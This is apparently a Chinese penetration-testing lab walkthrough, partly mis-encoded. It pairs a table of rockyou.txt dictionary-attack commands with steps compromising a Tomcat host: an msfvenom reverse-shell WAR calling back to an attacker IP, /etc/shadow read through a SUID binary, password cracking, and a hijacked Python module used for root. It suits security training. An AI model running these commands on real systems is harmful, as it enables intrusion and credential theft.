<p><strong>Kali Linux ä¸­ä½¿ç¨ rockyou.txt è¿è¡å¯ç ç ´è§£</strong></p>
<table>
<thead>
<tr>
<th style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">æ»å»ç®æ  (å å¯/ä¿æ¤æ¹å¼)</font></th>
<th style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">æ ¸å¿å·¥å·</font></th>
<th style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">å³é®åå¤æ­¥éª¤ (å¨è¿è¡æ»å»å½ä»¤å)</font></th>
<th style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">å¸åæ»å»å½ä»¤ç¤ºä¾</font></th>
<th style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">æ ¸å¿æè·¯ä¸è¯´æ</font></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left"><strong>ZIP åç¼©å</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;fcrackzip&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">ç¡®ä¿ç®æ  ZIP æä»¶å¨æ¬æºã</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;rockyou.txt&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> é»è®¤è·¯å¾ï¼</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;/usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;fcrackzip -v -D -p /usr/share/wordlists/rockyou.txt -u target.zip&lt;/font&gt;</code></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;-D&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æå®å­å¸æ¨¡å¼ï¼</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;-p&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æå®å­å¸è·¯å¾ï¼</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;-u&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> éªè¯å¯ç ãæ´åç ´è§£èæ¶è¾é¿ï¼å­å¸æ»å»æçæ´é«ã</font></td>
</tr>
<tr>
<td style="text-align: left"><strong>RAR åç¼©å</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;rarcrack&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;john&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">1. </font><strong>ä½¿ç¨ rarcrack</strong><font style="color: rgba(77, 77, 77, 1)">ï¼ å®è£ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;rarcrack&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> (</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;sudo apt install rarcrack&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">)ã</font><font style="color: rgba(77, 77, 77, 1)">   </font><font style="color: rgba(77, 77, 77, 1)">2. </font><strong>ä½¿ç¨ John</strong><font style="color: rgba(77, 77, 77, 1)">ï¼ éåç¨ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;rar2john&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æååå¸ã</font></td>
<td style="text-align: left"><strong>1. rarcrack:</strong><font style="color: rgba(77, 77, 77, 1)"> </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;rarcrack --type rar target.rar&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">   </font><strong>2. john:</strong><font style="color: rgba(77, 77, 77, 1)"> </font><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;rar2john target.rar &gt; rar_hash.txt&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt&lt;/font&gt;</code></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;rarcrack&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ¯æèªå¨çæµç±»åï¼XMLæä»¶è®°å½è¿åº¦ï¼ãJohn çæ¹å¼æ´éç¨ï¼åæååå¸ï¼åå¯¹åå¸è¿è¡ç ´è§£ã</font></td>
</tr>
<tr>
<td style="text-align: left"><strong>å¯ç åå¸ (å¦ /etc/shadow ä¸­ç Hash)</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;john&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hashcat&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">1. </font><strong>è·ååå¸</strong><font style="color: rgba(77, 77, 77, 1)">ï¼ éè¦å° </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;/etc/shadow&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> ä¸ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;/etc/passwd&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> åå¹¶æç´æ¥è·å¾åå¸ä¸²ã</font><font style="color: rgba(77, 77, 77, 1)">   </font><font style="color: rgba(77, 77, 77, 1)">2. </font><strong>è¯å«åå¸ç±»å</strong><font style="color: rgba(77, 77, 77, 1)">ï¼ ä½¿ç¨ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hashid&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;john --list=formats&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> è¯å«ã</font></td>
<td style="text-align: left"><strong>ä»¥ John ç ´è§£ MD5 ä¸ºä¾:</strong><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_file.txt&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">   </font><strong>ä»¥ hashcat ç ´è§£ SHA256 ä¸ºä¾:</strong><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hashcat -m 1400 -a 0 hash_file.txt /usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>
<td style="text-align: left"><strong>æå¸¸ç¨åºæ¯</strong><font style="color: rgba(77, 77, 77, 1)">ãå³é®å¨äºæ­£ç¡®è¯å«åå¸ç±»åï¼</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;-m&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;--format&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">ï¼ã</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hashcat&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ§è½æ´å¼ºï¼æ¯æ GPUãç ´è§£æåçé«åº¦ä¾èµå­å¸è´¨éã</font></td>
</tr>
<tr>
<td style="text-align: left"><strong>SSH æå¡ç»å½</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hydra&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;medusa&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">ç¡®è®¤ç®æ ä¸»æº SSH æå¡ï¼22ç«¯å£ï¼å¼æ¾ï¼ä¸åè®¸å¯ç è®¤è¯ã</font></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hydra -l &lt;ç¨æ·å&gt; -P /usr/share/wordlists/rockyou.txt &lt;ç®æ IP&gt; ssh&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">   </font><font style="color: rgba(77, 77, 77, 1)">ææå®ç¨æ·åè¡¨ï¼</font><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hydra -L user_list.txt -P /usr/share/wordlists/rockyou.txt ssh://&lt;ç®æ IP&gt;&lt;/font&gt;</code></td>
<td style="text-align: left"><strong>ç½ç»åè®®çç ´</strong><font style="color: rgba(77, 77, 77, 1)">ã</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;-l&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æå®åä¸ªç¨æ·ï¼</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;-L&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æå®ç¨æ·å­å¸ãæ³¨æï¼é¢ç¹å°è¯å¯è½è§¦åéå®æè®°å½æ¥å¿ã</font></td>
</tr>
<tr>
<td style="text-align: left"><strong>FTP æå¡ç»å½</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hydra&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">ç¡®è®¤ç®æ ä¸»æº FTP æå¡ï¼21ç«¯å£ï¼å¼æ¾ã</font></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hydra -l &lt;ç¨æ·å&gt; -P /usr/share/wordlists/rockyou.txt ftp://&lt;ç®æ IP&gt;&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">   </font><font style="color: rgba(77, 77, 77, 1)">æå¿åæµè¯ï¼</font><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hydra -l anonymous -P ââ ftp://&lt;ç®æ IP&gt;&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">æè·¯å SSHãéå¸¸åå°è¯ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;anonymous&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> å¿åç»å½ã</font></td>
</tr>
<tr>
<td style="text-align: left"><strong>HTTP è¡¨åç»å½ (å¦ Web åå°)</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hydra&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">1. åæç»å½è¯·æ±ï¼ç¨ Burp Suite æåï¼ã</font><font style="color: rgba(77, 77, 77, 1)">   </font><font style="color: rgba(77, 77, 77, 1)">2. ç¡®å®ç»å½ URLãç¨æ·å/å¯ç åæ°åãå¤±è´¥ååºç¹å¾ã</font></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;ç®æ IP&gt; http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=ç»å½å¤±è´¥"&lt;/font&gt;</code></td>
<td style="text-align: left"><strong>POST æ°æ®åçç ´</strong><font style="color: rgba(77, 77, 77, 1)">ãè¯­æ³å¤æä½çµæ´»ã</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;^USER^&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> å </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;^PASS^&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ¯å ä½ç¬¦ï¼</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;F=...&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æå®å¤±è´¥å­ç¬¦ä¸²ãæåçåå³äºè¯·æ±æé çåç¡®æ§ã</font></td>
</tr>
<tr>
<td style="text-align: left"><strong>WordPress åå°</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;wpscan&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">ç¡®è®¤ç®æ ä¸º WordPress ç«ç¹ã</font></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;wpscan --url http://&lt;ç®æ ç«ç¹&gt; --passwords /usr/share/wordlists/rockyou.txt --usernames admin&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">ä¸é¨éå¯¹ WordPress çå·¥å·ï¼æ¯éç¨ HTTP çç ´æ´æºè½ï¼è½æä¸¾ç¨æ·åå¹¶è§é¿é¨åéå®æºå¶ã</font></td>
</tr>
<tr>
<td style="text-align: left"><strong>Wi-Fi WPA/WPA2 æ¡æå</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;aircrack-ng&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">1. å·²éè¿ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;airodump-ng&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æè·å°åå«åæ­¥æ¡æç </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;.cap&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æä»¶ã</font><font style="color: rgba(77, 77, 77, 1)">   </font><font style="color: rgba(77, 77, 77, 1)">2. ç¡®è®¤æ¡æåææï¼</font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;aircrack-ng&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> è½è¯å«ï¼ã</font></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file.cap&lt;/font&gt;</code></td>
<td style="text-align: left"><strong>ç¦»çº¿ç ´è§£æ çº¿å¯ç </strong><font style="color: rgba(77, 77, 77, 1)">ãæ ¸å¿æ¯æè·å°ç¨æ·è¿æ¥æ¶çæ¡æåãç ´è§£éåº¦åå³äºå¯ç å¨å­å¸ä¸­çä½ç½®åç¡¬ä»¶ç®åã</font></td>
</tr>
<tr>
<td style="text-align: left"><strong>å å¯ç PDF æä»¶</strong></td>
<td style="text-align: left"><code>&lt;font style="color:rgb(77, 77, 77);"&gt;john&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;pdfcrack&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">ä½¿ç¨ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;pdf2john&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;pdfcrack&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> æåæç´æ¥ç ´è§£ã</font></td>
<td style="text-align: left"><strong>ä½¿ç¨ John:</strong><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;pdf2john target.pdf &gt; pdf_hash.txt&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">   </font><strong>ä½¿ç¨ pdfcrack:</strong><font style="color: rgba(77, 77, 77, 1)">   </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;pdfcrack -f target.pdf -w /usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>
<td style="text-align: left"><font style="color: rgba(77, 77, 77, 1)">æè·¯ä¸ RAR ç±»ä¼¼ï¼åæåå¯ç åå¸ï¼å¦ææ¯æï¼ï¼åç¨å­å¸æ»å»ã</font></td>
</tr>
</tbody>
</table>
<p><strong>å­å¸è·¯å¾</strong><font style="color: rgba(77, 77, 77, 1)">ï¼ </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;rockyou.txt&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)"> é»è®¤ä½äº </font><code>&lt;font style="color:rgb(77, 77, 77);"&gt;/usr/share/wordlists/&lt;/font&gt;</code><font style="color: rgba(77, 77, 77, 1)">ãé¦æ¬¡ä½¿ç¨å¯è½éè¦è§£åï¼</font></p>
<pre><code class="language-bash">sudo gunzip /usr/share/wordlists/rockyou.txt.gz
</code></pre>
<p>çç ´ï¼</p>
<pre><code class="language-plain">âââ(rootã¿xiao)-[/opt]
ââ# fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip


PASSWORD FOUND!!!!: pw == @administrator_hi5
</code></pre>
<p>å¾å°å¯ç ï¼@administrator_hi5</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840515850-f1235a74-7eea-49a5-b887-170449b7c94b.png" alt="" loading="lazy"></p>
<p><strong>è§£åæ¥çè§£ååºæ¥çåå®¹ï¼</strong></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840578959-7f6785d8-85b1-4677-b602-ab5675acc354.png" alt="" loading="lazy"></p>
<p><strong>å¨tomcat-user.xmlæä»¶ä¸­åç°ä¸¤ä¸ªè´¦æ·åå¯ç </strong></p>
<pre><code class="language-xml">&lt;role rolename="manager-gui"/&gt;
&lt;user username="manager" password="melehifokivai" roles="manager-gui"/&gt;

&lt;role rolename="admin-gui"/&gt;
&lt;user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/&gt;
&lt;/tomcat-users&gt;
</code></pre>
<p><strong>è´¦å·1ï¼manager melehifokivai</strong></p>
<p><strong>è´¦å·2ï¼admin melehifokivai</strong></p>
<p><strong>è´¦å·ç»å½</strong></p>
<p>æµè¯è§£åå¾å°çè´¦å·å¯ç </p>
<p>adminåmanagerè´¦æ·é½è½ç»å½æå</p>
<p><a href="http://192.168.222.134:8080/manager/html" target="_blank" rel="noopener nofollow">http://192.168.222.134:8080/manager/html</a></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840894776-7a0986dc-ade3-4785-8e77-a35781f0265f.png" alt="" loading="lazy"></p>
<p>åç°æä»¶ä¸ä¼ ï¼å¯ä¸ä¼ æä»¶ä¸º<font style="color: rgba(0, 0, 0, 1)">WARæä»¶</font></p>
<p>è®¿é®http://192.168.222.134:8080/readme.txt</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767841873877-cea13c4e-60ed-4e79-8b33-c75c05dc2b80.png" alt="" loading="lazy"></p>
<p>å¾å°ä¿¡æ¯æä¸ä¸ªå å¯æä»¶çæµæ¯backup.zipï¼çæµç®¡çåä¸º<strong><font style="color: rgba(0, 0, 0, 1)">randyï¼</font></strong></p>
<h1 id="0x02æ¼æ´å©ç¨-"><font style="color: rgba(0, 0, 0, 1)">0x02æ¼æ´å©ç¨ </font></h1>
<h2 id="21toncatä¸­waræä»¶ä¸ä¼ -shell">2.1toncatä¸­waræä»¶ä¸ä¼ -shell</h2>
<p>msfçæ<font style="color: rgba(15, 17, 21, 1)">JSP åå Shell ç WAR æä»¶</font></p>
<pre><code class="language-python">sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.222.137" LPORT=8888 -f war &gt; shell.war
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768298973138-a6d047cf-fa8e-4324-a965-7454625b213a.png" alt="" loading="lazy"></p>
<p>ä¸ä¼ </p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299005190-63e670bc-10ff-40ee-a505-597111589c12.png" alt="" loading="lazy"></p>
<p>åå¼¹shell</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299028082-c119a58c-a87b-4310-9efa-adc162f66a48.png" alt="" loading="lazy"></p>
<p><font style="color: rgba(85, 86, 102, 1); background-color: rgba(238, 240, 244, 1)">GetShellä¹åï¼éè¿ä¸æ®µpythonä»£ç åå»ºè¦ç»äº¤äºå¼ç»ç«¯ã</font></p>
<pre><code class="language-python">python3 -c 'import pty; pty.spawn("/bin/bash")'
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299297993-388f1683-17d1-41a5-a67d-c0bd5193a25c.png" alt="" loading="lazy"></p>
<pre><code class="language-python"># æ¥è¯¢å·å¤suidæ å¿çæä»¶
find / -perm -u=s -type f 2&gt;&gt;/dev/null
# æ¥è¯¢å½åç¨æ·æ¯å¦æå¯å©ç¨sudoææçå½ä»¤
sudo -l
# æ¥çå¤ä»½æä»¶
find / -name "*backup*" 2&gt;&gt;/dev/null
</code></pre>
<p>æ¥çhomeç®å½ä¸é¢æä¸¤ä¸ªç¨æ·ï¼jaye  randy</p>
<p>ç»åä¹åçè´¦å·å¯ç æ¥å¯ç çæµï¼</p>
<p>å¾å°ï¼jaye <strong>melehifokivai</strong></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768300529905-de5d14bc-0e9c-44cc-9d2d-4bcf17e4f845.png" alt="" loading="lazy"></p>
<p>waræä»¶ä¸ä¼ ï¼</p>
<p><strong><font style="color: rgba(51, 51, 51, 1)">WARï¼Web Application Archiveï¼</font></strong><font style="color: rgba(51, 51, 51, 1)"> æ¯ Java Web åºç¨ç¨åºçæ åæåæ ¼å¼ï¼ä¸ä¸ºé¨ç½²å° </font><strong><font style="color: rgba(51, 51, 51, 1)">Servlet å®¹å¨</font></strong><font style="color: rgba(51, 51, 51, 1)">ï¼å¦ TomcatãJettyï¼èè®¾è®¡ãå®æ¬è´¨ä¸æ¯ä¸ä¸ªåç¼©æä»¶ï¼æ©å±åä¸º </font><code>&lt;font style="color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);"&gt;.war&lt;/font&gt;</code><font style="color: rgba(51, 51, 51, 1)">ï¼ï¼éµå¾ªç¹å®çç®å½ç»æï¼åå« Web åºç¨çææä»£ç ãèµæºåéç½®ã</font><br>
ä¸è¬æåµå©ç¨æè·¯ï¼<br>
jspé©¬è½¬æ¢ä¸ºwaråä¸ä¼ </p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767861822414-ded9f771-cd70-4a24-9d87-89814e4b38be.png" alt="" loading="lazy"></p>
<h2 id="22-msfæ¼æ´å©ç¨-shell"><font style="color: rgba(15, 17, 21, 1)">2.2 msfæ¼æ´å©ç¨-shell</font></h2>
<p><font style="color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1)">msf æTomcat ä¸ä¼ webshellçæ¨¡åï¼æç¨æ·ååå¯ç å°±å¯ä»¥ä½¿ç¨ï¼</font></p>
<pre><code class="language-python">search tomcat upload
use 7
show options
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767847629830-5bfe712d-d3c4-4308-951e-91ce56938d85.png" alt="" loading="lazy"></p>
<p>æ¥çéè¦è®¾ç½®çåæ°</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767847669431-ba4df25a-d852-458b-8bb2-5a6692fab9b9.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848191317-43a10ac8-f784-4c8f-83d5-eb2640f729fa.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848225249-ef26df62-a3ce-48d8-9bb3-3c3dea3892ae.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848242089-b16d2c47-3abe-4290-a029-dfb464358552.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848253798-06b751ac-015c-4380-af43-529e6c93a457.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848596168-2fc1bbc6-8597-475a-9ea9-485327445731.png" alt="" loading="lazy"></p>
<p>æ¥çuser.txtå¾å°ç¬¬ä¸ä¸ªflag</p>
<p>homeç®å½ä¸æä¸¤ä¸ªæä»¶å¤¹ï¼å ä¸ä¹åreadme.txtåºæ¥ççæµå¯è½æä¸¤ä¸ªç¨æ·ï¼jayeårandy</p>
<p>ä¹åæ«æç«¯å£çæ¶ååç°22ç«¯å£å¼æ¾<a target="_blank">é¾æ¥</a></p>
<p>å©ç¨ä¹ååç¼©åæä»¶ä¸­å¾å°çå¯ç sshä¸ä¸è¿ä¸¤ä¸ªè´¦æ·ï¼jayeç»å½æå</p>
<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848497149-7dbcf576-9ce7-47c2-852e-40492d925636.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848619500-c4b7c805-350c-41dc-b6ca-4d7fd3351d35.png" alt="" loading="lazy"></p>
<p>ç»å½è¿æ¥ä¹åæ¥æ¾è½å©ç¨çä¸è¥¿ï¼åççæäºå¥ï¼ï¼<br>
<img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849098656-118fa5a4-a6ac-44bc-91d1-0a5c3d6de862.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849163723-f3c0f89f-1b83-41a5-9171-857cecff071c.png" alt="" loading="lazy"></p>
<p>æ¾å°ä¸ä¸ªå¯æ§è¡æä»¶lookï¼æ¯ç³»ç»çlook</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849251300-4e6e6ffc-3fed-42e4-aa90-4edeaea62133.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849316970-058bd5f2-6df7-43e5-a15b-f20304385091.png" alt="" loading="lazy"></p>
<p>lookå¯ä»¥è¶æè®¿é®ï¼æ¥ç/etc/shadow</p>
<p><code>look</code>è¶æå½ä»¤ä½¿ç¨æ¹æ³ï¼<a href="https://gtfobins.github.io/gtfobins/look/" target="_blank" rel="noopener nofollow">https://gtfobins.github.io/gtfobins/look/</a></p>
<pre><code class="language-shell">LFILE=file_to_read
./look '' "$LFILE"
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767852700836-c03d0b5f-941e-4693-ad5b-915f40692179.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767852711349-e7d362bb-b5fa-40ab-8ded-a88731ffad65.png" alt="" loading="lazy"></p>
<p><font style="color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1)">æ /etc/shadow æä»¶åpasswdæä»¶å¤å¶ä¸æ¥,ï¼ä¿å­å°æ¬å°ã/etc/passwd æä»¶å¯ä»¥å¨msfæ§å¶å°è·åï¼ä¹å¯ä»¥ç¨ä¸è¿°æ¹å¼è·åï¼ä½¿ç¨ unshadow å½ä»¤çæéè¦ç ´è§£çå¯ç ,æä»¬åªç¨çç ´rootçårandå°±è¡äºï¼</font></p>
<pre><code class="language-shell">unshadow passwd ushadow &gt; pass.txt
</code></pre>
<p><font style="color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1)">ç¨johnç ´è§£ä¸ä¸,ï¼</font></p>
<pre><code class="language-shell">john --wordlist=/usr/share/wordlists/rockyou.txt shadow
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767856185003-928062a7-c19a-41ae-8f39-75caa0ca1217.png" alt="" loading="lazy"></p>
<p><font style="color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1)">çç ´å¾å°ï¼randy:07051986randy</font></p>
<p>ç»å½<font style="color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1)">randy</font></p>
<p><font style="color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1)">å¨æ ¹ç®å½ä¸åç°ä¸ä¸ªpythonå¯æ§è¡ èæ¬</font></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767857029281-ef4ba5b6-d896-4cd3-a25b-7cb5f4d57a4c.png" alt="" loading="lazy"></p>
<h2 id="23ææ-æä»¶">2.3ææ-æä»¶</h2>
<p>çä¸ä¸æéï¼åç°è¿ä¸ªpythonæä»¶ä¸è½ä¿®æ¹</p>
<p>ççå¯ä»¥å¹²ä¸äºä»ä¹</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858343998-deb9e511-fc73-4e88-a2c9-a1e0adcc4385.png" alt="" loading="lazy"></p>
<p>ä½æ¯å¨ä»£ç ä¸­å¼å¥äºä¸ä¸ªbase64æ¨¡å</p>
<p>ççè¿ä¸ªæä»¶å¨python3.8ç®å½ä¸</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858240847-acdc523c-4639-488c-9e46-8e4de021ae4b.png" alt="" loading="lazy"></p>
<p>æ¥çä¸ä¸æé</p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858360245-61c74e0b-e0d3-4491-9ae3-0011ca29dd54.png" alt="" loading="lazy"></p>
<p>å¯ä»¥ç¼è¾ï¼åå¥shell</p>
<pre><code class="language-python">import os

os.system("/bin/bash")
</code></pre>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860492323-7b06b3b3-5d88-45fc-b1c2-c856b3be623b.png" alt="" loading="lazy"></p>

<p><img src="https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858778389-d04b98f1-7d28-48e9-a155-a9476a5c0690.png" alt="" loading="lazy"></p>
<p>æ§è¡èæ¬</p>

